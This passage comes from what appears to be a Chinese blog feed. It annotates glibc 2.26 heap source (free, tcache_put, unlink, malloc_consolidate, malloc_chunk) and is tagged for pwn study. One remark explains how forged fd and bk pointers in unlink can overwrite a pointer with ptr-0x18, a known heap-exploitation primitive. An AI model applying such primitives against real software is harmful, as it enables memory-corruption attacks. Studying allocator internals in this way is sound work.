consolidate possibly-surrounding</span></span><br><span class="line"><span class="comment">      chunks. Then, if the total unused topmost memory exceeds trim</span></span><br><span class="line"><span class="comment">      threshold, ask malloc_trim to reduce top.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Unless max_fast is 0, we don&#x27;t know if there are fastbins</span></span><br><span class="line"><span class="comment">      bordering top, so we cannot tell for sure whether threshold</span></span><br><span class="line"><span class="comment">      has been reached unless fastbins are consolidated.  But we</span></span><br><span class="line"><span class="comment">      don&#x27;t want to consolidate on each free.  As a compromise,</span></span><br><span class="line"><span class="comment">      consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD</span></span><br><span class="line"><span class="comment">      is reached.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"><span class="comment">//如果要合并之后chunk过大，就合并fast bin，并考虑减小top chunk</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (atomic_load_relaxed(&amp;av-&gt;have_fastchunks))</span><br><span class="line">        malloc_consolidate(av);<span class="comment">//合并fast bin</span></span><br><span class="line">  <span class="comment">//如果是main arena，并且top chunk的大小超出了阀值就缩减top chunk的大小</span></span><br><span class="line">      <span class="keyword">if</span> (av == &amp;main_arena)</span><br><span class="line">      &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> MORECORE_CANNOT_TRIM</span></span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(chunksize(av-&gt;top)) &gt;=</span><br><span class="line">            (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(mp_.trim_threshold))</span><br><span class="line">          systrim(mp_.top_pad, av);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">//如果不是main arena就调用heap_trim缩减大小</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">/* Always try heap_trim(), even if the top chunk is not</span></span><br><span class="line"><span class="comment">   large, because the corresponding heap might go away.  */</span></span><br><span class="line">        heap_info *heap = heap_for_ptr(top(av));</span><br><span class="line"></span><br><span class="line">        assert(heap-&gt;ar_ptr == av);</span><br><span class="line">        heap_trim(heap, mp_.top_pad);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!have_lock)</span><br><span class="line">      __libc_lock_unlock(av-&gt;mutex);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If the chunk was allocated via mmap, release via munmap().</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="comment">//如果chunk是通过mmap分配的就调用munmap_chunk来释放</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    munmap_chunk(p);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="tcache-put"><a href="#tcache-put" class="headerlink" title="tcache_put"></a>tcache_put</h2><p>因为tcache_put没有做太多的安全性检查，所以在调用之前要确保<code>tc_idx</code>合法且tcache链未满</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span></span><br><span class="line"><span class="comment">   for more chunks.  */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> __always_inline <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">tcache_put</span><span class="params">(mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *)chunk2mem(chunk);<span class="comment">//将chunk转成内存地址形式</span></span><br><span class="line">  assert(tc_idx &lt; TCACHE_MAX_BINS);<span class="comment">//确保tc_idx的合法性</span></span><br><span class="line">  <span class="comment">//将e插入链表</span></span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  <span class="comment">//链表中的chunk数加一</span></span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h2><p>unlink将一个chunk从链表中移除，但是它只检查了P前后的chunk是否都指向它，如果我们伪造P的<code>fd</code>和<code>bk</code>，可以将一个 内存地址<code>ptr</code>的值修改为<code>ptr-0x18</code>的值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD)                                                                                               \</span></span><br><span class="line"><span class="meta">  &#123;                                                                                                                         \</span></span><br><span class="line"><span class="meta">    <span class="comment">//检查p的两处size是否一致，即p中存储的自己的size和p的下一个chunk存储的p的size</span></span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect(chunksize(P) != prev_size(next_chunk(P)), <span class="number">0</span>))                                                      \</span><br><span class="line">      malloc_printerr(<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);                                                                      \</span><br><span class="line">    FD = P-&gt;fd;                                                                                                             \</span><br><span class="line">    BK = P-&gt;bk;                                                                                                             \</span><br><span class="line">    <span class="comment">//检查p的前后两个chunk是否都指向p</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect(FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))                                                                    \</span><br><span class="line">      malloc_printerr(<span class="string">&quot;corrupted double-linked list&quot;</span>);                                                                      \</span><br><span class="line">    <span class="keyword">else</span>                                                                                                                    \</span><br><span class="line">    &#123;                                                                                                                       \</span><br><span class="line">      <span class="comment">//将p从链表中移除</span></span><br><span class="line">      FD-&gt;bk = BK;                                                                                                          \</span><br><span class="line">      BK-&gt;fd = FD;                                                                                                          \</span><br><span class="line">      <span class="comment">//如果是large bin还要处理nextsize指针</span></span><br><span class="line">      <span class="keyword">if</span> (!in_smallbin_range(chunksize_nomask(P)) &amp;&amp; __builtin_expect(P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>))                           \</span><br><span class="line">      &#123;                                                                                                                     \</span><br><span class="line">        <span class="comment">//检查前后chunk的nextsize指针是否合法</span></span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect(P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>) || __builtin_expect(P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>)) \</span><br><span class="line">          malloc_printerr(<span class="string">&quot;corrupted double-linked list (not small)&quot;</span>);                                                      \</span><br><span class="line">        <span class="comment">//根据不同情况将p从nextsize链中移除</span></span><br><span class="line">        <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>)                                                                                        \</span><br><span class="line">        &#123;                                                                                                                   \</span><br><span class="line">          <span class="comment">//如果链表中只有一种大小的chunk</span></span><br><span class="line">          <span class="keyword">if</span> (P-&gt;fd_nextsize == P)                                                                                          \</span><br><span class="line">            FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;                                                                         \</span><br><span class="line">          <span class="keyword">else</span>                                                                                                              \</span><br><span class="line">          &#123;                                                                                                                 \</span><br><span class="line">            FD-&gt;fd_nextsize = P-&gt;fd_nextsize;                                                                               \</span><br><span class="line">            FD-&gt;bk_nextsize = P-&gt;bk_nextsize;                                                                               \</span><br><span class="line">            P-&gt;fd_nextsize-&gt;bk_nextsize = FD;                                                                               \</span><br><span class="line">            P-&gt;bk_nextsize-&gt;fd_nextsize = FD;                                                                               \</span><br><span class="line">          &#125;                                                                                                                 \</span><br><span class="line">        &#125;                                                                                                                   \</span><br><span class="line">        <span class="keyword">else</span>                                                                                                                \</span><br><span class="line">        &#123;                                                                                                                   \</span><br><span class="line">          P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;                                                                     \</span><br><span class="line">          P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;                                                                     \</span><br><span class="line">        &#125;                                                                                                                   \</span><br><span class="line">      &#125;                                                                                                                     \</span><br><span class="line">    &#125;                                                                                                                       \</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h2 id="malloc-consolidate"><a href="#malloc-consolidate" class="headerlink" title="malloc_consolidate"></a>malloc_consolidate</h2><p>malloc_consolidate将遍历所有fast bin链表中的所有chunk，将它们与相邻的空闲chunk合并，然后放入unsorted bin中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  ------------------------- malloc_consolidate -------------------------</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  malloc_consolidate is a specialized version of free() that tears</span></span><br><span class="line"><span class="comment">  down chunks held in fastbins.  Free itself cannot be used for this</span></span><br><span class="line"><span class="comment">  purpose since, among other things, it might place chunks back onto</span></span><br><span class="line"><span class="comment">  fastbins.  So, instead, we need to use a minor variant of the same</span></span><br><span class="line"><span class="comment">  code.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  Also, because this routine needs to be called the first time through</span></span><br><span class="line"><span class="comment">  malloc anyway, it turns out to be the perfect place to trigger</span></span><br><span class="line"><span class="comment">  initialization code.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">malloc_consolidate</span><span class="params">(mstate av)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  mfastbinptr *fb;          <span class="comment">/* current fastbin being consolidated */</span></span><br><span class="line">  mfastbinptr *maxfb;       <span class="comment">/* last fastbin (for loop control) */</span></span><br><span class="line">  mchunkptr p;              <span class="comment">/* current chunk being consolidated */</span></span><br><span class="line">  mchunkptr nextp;          <span class="comment">/* next chunk to consolidate */</span></span><br><span class="line">  mchunkptr unsorted_bin;   <span class="comment">/* bin header */</span></span><br><span class="line">  mchunkptr first_unsorted; <span class="comment">/* chunk to link to */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* These have same use as in free() */</span></span><br><span class="line">  mchunkptr nextchunk;</span><br><span class="line">  INTERNAL_SIZE_T size;</span><br><span class="line">  INTERNAL_SIZE_T nextsize;</span><br><span class="line">  INTERNAL_SIZE_T prevsize;</span><br><span class="line">  <span class="keyword">int</span> nextinuse;</span><br><span class="line">  mchunkptr bck;</span><br><span class="line">  mchunkptr fwd;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If max_fast is 0, we know that av hasn&#x27;t</span></span><br><span class="line"><span class="comment">    yet been initialized, in which case do so below</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (get_max_fast() != <span class="number">0</span>)<span class="comment">//如果av已经初始化</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">//设置av中没有fastchunks，因为即将全部合并</span></span><br><span class="line">    atomic_store_relaxed(&amp;av-&gt;have_fastchunks, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">    unsorted_bin = unsorted_chunks(av);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Remove each chunk from fast bin and consolidate it, placing it</span></span><br><span class="line"><span class="comment">      then in unsorted bin. Among other reasons for doing this,</span></span><br><span class="line"><span class="comment">      placing in unsorted bin avoids needing to calculate actual bins</span></span><br><span class="line"><span class="comment">      until malloc is sure that chunks aren&#x27;t immediately going to be</span></span><br><span class="line"><span class="comment">      reused anyway.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    maxfb = &amp;fastbin(av, NFASTBINS - <span class="number">1</span>);<span class="comment">//size最大的fastbin</span></span><br><span class="line">    fb = &amp;fastbin(av, <span class="number">0</span>);<span class="comment">//size最小的fastbin</span></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      p = atomic_exchange_acq(fb, <span class="literal">NULL</span>);<span class="comment">//p=fb</span></span><br><span class="line">      <span class="keyword">if</span> (p != <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          check_inuse_chunk(av, p);</span><br><span class="line">          nextp = p-&gt;fd;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Slightly streamlined version of consolidation code in free() */</span></span><br><span class="line">          size = chunksize(p);</span><br><span class="line">          nextchunk = chunk_at_offset(p, size);</span><br><span class="line">          nextsize = chunksize(nextchunk);</span><br><span class="line"></span><br><span class="line">          <span class="comment">//如果前一个chunk是没有被使用，就让它与p合并</span></span><br><span class="line">          <span class="keyword">if</span> (!prev_inuse(p))</span><br><span class="line">          &#123;</span><br><span class="line">            prevsize = prev_size(p);</span><br><span class="line">            size += prevsize;</span><br><span class="line">            p = chunk_at_offset(p, -((<span class="keyword">long</span>)prevsize));</span><br><span class="line">            unlink(av, p, bck, fwd);</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">//如果后一个chunk不是top chunk</span></span><br><span class="line">          <span class="keyword">if</span> (nextchunk != av-&gt;top)</span><br><span class="line">          &#123;</span><br><span class="line">            nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!nextinuse)<span class="comment">//如果后一个chunk没有被使用</span></span><br><span class="line">            &#123;</span><br><span class="line">              size += nextsize;</span><br><span class="line">              unlink(av, nextchunk, bck, fwd);<span class="comment">//将后一个chunk从链表中解除</span></span><br><span class="line">              <span class="comment">//p的size增加，后一个chunk从链表中移除，即将p和后一个chunk合并</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">              <span class="comment">//将p设置为被使用状态</span></span><br><span class="line">              clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//将p放入unsorted bin链表</span></span><br><span class="line">            first_unsorted = unsorted_bin-&gt;fd;</span><br><span class="line">            unsorted_bin-&gt;fd = p;</span><br><span class="line">            first_unsorted-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//如果属于large bin将nextsize指针清空</span></span><br><span class="line">            <span class="keyword">if</span> (!in_smallbin_range(size))</span><br><span class="line">            &#123;</span><br><span class="line">              p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">              p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//设置p相关的属性</span></span><br><span class="line">            set_head(p, size | PREV_INUSE);</span><br><span class="line">            p-&gt;bk = unsorted_bin;</span><br><span class="line">            p-&gt;fd = first_unsorted;</span><br><span class="line">            set_foot(p, size);</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">//如果下一个chunk是top chunk就将p并入top chunk</span></span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            size += nextsize;</span><br><span class="line">            set_head(p, size | PREV_INUSE);</span><br><span class="line">            av-&gt;top = p;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">while</span> ((p = nextp) != <span class="number">0</span>);<span class="comment">//遍历链表中的每一个chunk</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (fb++ != maxfb);<span class="comment">//遍历所有fast bin链表</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span><span class="comment">//如果av没有初始化就先初始化</span></span><br><span class="line">  &#123;</span><br><span class="line">    malloc_init_state(av);</span><br><span class="line">    check_malloc_state(av);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>free的总体流程为：首先判断chunk是否由mmap分配，如果是调用<code>munmap_chunk</code>来释放，然后返回，否则进入<code>_int_free</code>来释放。在<code>_int_free</code>中，先判断是否满足tcache的范围，并且相应的tcache链表未满，如果是，将chunk放入tcache链表中后直接返回，否则判断是否属于fast bin的范围，如果是放入fast bin后结束，否则再次判断chunk是否由mmap分配，如果是调用<code>munmap_chunk</code>来释放，然后结束，如果不是且上一个chunk没有被使用，就向上合并。然后判断下一个chunk是不是top chunk，如果是则直接将当前chunk合并到top chunk，如果不是且下一个chunk没有被使用就向下合并，然后将合并后的chunk放入unsorted bin中。最后如果合并后的chunk的大小超过阈值，就调用<code>malloc_consolidate</code>来合并fast bin中的所有chunk并放入unsorted bin中，并考虑缩减top chunk。流程图如下：</p><p><img src="https://z3.ax1x.com/2021/10/23/5RkpjI.png" alt="5RkpjI.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;上一篇文章主要介绍了glibc2.26下Linux堆的相关概念和分配原理，本文将继续根据glibc2.26的源码介绍Linux的堆释放原理。&lt;/p&gt;</summary>
    
    
    
    
    <category term="pwn" scheme="http://cyyyber.icu/tags/pwn/"/>
    
    <category term="源码分析" scheme="http://cyyyber.icu/tags/%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>glibc(2.26) malloc原理及源码分析</title>
    <link href="http://cyyyber.icu/2021/10/17/glibc-malloc%E5%8E%9F%E7%90%86%E5%8F%8A%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    <id>http://cyyyber.icu/2021/10/17/glibc-malloc%E5%8E%9F%E7%90%86%E5%8F%8A%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</id>
    <published>2021-10-16T16:00:00.000Z</published>
    <updated>2021-10-17T15:15:18.924Z</updated>
    
    <content type="html"><![CDATA[<p>glibc2.26开始引入了tcache的技术，提升了堆管理的性能。本文根据glibc2.26的源码介绍含tcache技术的Linux堆分配原理。</p><span id="more"></span><h1 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h1><h2 id="arena"><a href="#arena" class="headerlink" title="arena"></a>arena</h2><p>以前的Linux使用的ldmalloc只支持单线程的堆分配，现在的ptmalloc2支持多线程的堆分配，因为它给每个线程分配了一块内存区，这个内存区就叫做arena。（其实arena的数量是有限制的，当线程数大于arena的数量上限的时候就会有线程共用arena）</p><h2 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h2><p>为了更有效率地分配空闲的堆内存，ptmalloc2把空闲的chunk进行了分类，并用链表把不同类的chunk串起来就形成了bin。不同类的chunk组成的bin有不同的名字：fast bin, unsorted bin, small bin, large bin，这些bin的不同之处将在后面源码分析的部分说明。</p><h1 id="基本结构"><a href="#基本结构" class="headerlink" title="基本结构"></a>基本结构</h1><h2 id="malloc-chunk"><a href="#malloc-chunk" class="headerlink" title="malloc_chunk"></a>malloc_chunk</h2><p><code>malloc_chunk</code>结构用来表示一个chunk，代码中的注释对其解释得很详细了，总体意思就是说：当当前chunk被使用时，只有<code>mchunk_prev_size</code>和<code>mchunk_size</code>正常使用，其余部分全部用来存储用户数据，下一个chunk的<code>mchunk_prev_size</code>也用来存用户数据；当当前chunk空闲时，<code>fd</code>指向下一个chunk，<code>bd</code>指向上一个chunk，下一个chunk的<code>mchunk_prev_size</code>存的是当前chunk的size。另外，因为<code>mchunk_size</code>的低三位被用来存储是否属于主线程、是否由mmap分配、上一个chunk是否被使用等信息，所以<code>mchunk_size*8</code>才是当前chunk的真实大小。这样的结构设计充分利用了空间，当chunk被使用时是没有在链表中的，所以不需要指针，与它物理相邻的下一个chunk也不需要通过<code>mchunk_prev_size</code>来找到它，所以下一个chunk的<code>mchunk_prev_size</code>的空间也被用来存储数据。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This struct declaration is misleading (but accurate and necessary).</span></span><br><span class="line"><span class="comment">  It declares a &quot;view&quot; into memory allowing access to necessary</span></span><br><span class="line"><span class="comment">  fields at known offsets from a given base. See explanation below.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   malloc_chunk details:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    (The following includes lightly edited explanations by Colin Plumb.)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Chunks of memory are maintained using a `boundary tag&#x27; method as</span></span><br><span class="line"><span class="comment">    described in e.g., Knuth or Standish.  (See the paper by Paul</span></span><br><span class="line"><span class="comment">    Wilson ftp://ftp.cs.utexas.edu/pub/garbage/allocsrv.ps for a</span></span><br><span class="line"><span class="comment">    survey of such techniques.)  Sizes of free chunks are stored both</span></span><br><span class="line"><span class="comment">    in the front of each chunk and at the end.  This makes</span></span><br><span class="line"><span class="comment">    consolidating fragmented chunks into bigger chunks very fast.  The</span></span><br><span class="line"><span class="comment">    size fields also hold bits representing whether chunks are free or</span></span><br><span class="line"><span class="comment">    in use.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    An allocated chunk looks like this:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    chunk-&gt; 